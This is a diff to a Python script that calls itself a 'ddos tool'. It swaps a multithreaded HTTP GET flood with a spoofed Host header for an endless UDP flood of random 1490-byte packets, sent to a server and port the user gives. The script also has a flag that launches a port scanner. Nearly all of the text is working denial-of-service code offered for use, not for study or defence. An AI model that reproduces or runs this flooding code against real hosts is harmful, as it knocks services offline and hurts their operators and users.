@@ -1,10 +1,7 @@
-import time
-import random
 import argparse 
 import os
 import socket
-import struct
-import threading
+import random
 #lib to install : argparse
 
 
@@ -23,34 +20,16 @@ print ("Use -h to see the options")
 
 #ddos tool 
 def death_note():
-    target = args.server
-    port = int(input("[+]Port for attacking : "))
-    fake_ip = '192.168.0.1'
-    def attack():
-        while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-            s.close()
-
-    for i in range(500):
-        thread = threading.Thread(target=attack)
-        thread.start()
-    attack_num = 0
-    
-    def attack():
-        while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-            
-            global attack_num
-            attack_num += 1
-            print(attack_num)
-            
-            s.close()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    ip = (args.server)
+    port = int(input("[+]Port :"))
+    s = 0
+    while True :
+        sock.sendto(bytes, (ip,port))
+        s = s + 1
+        print ("Killed :",s,"for", ip)
+        
     
 
 
@@ -59,7 +38,7 @@ def death_note():
 #starting input !``
 
 parser = argparse.ArgumentParser()
-parser.add_argument("--server", action="store",  help="attack to server ip -s ip") 
+parser.add_argument("--server", action="store", help="attack to server ip -s ip") 
 parser.add_argument("--port_scanner", help="Add a port scanner to do a quick scan", action = "store_true")
 args = parser.parse_args()
     
@@ -68,7 +47,7 @@ if args.server :
     
     death_note()
 if args.port_scanner :
-    os.system("python3 port_scanner.py ")
+    os.system("python port_scanner.py ")
 
 
 
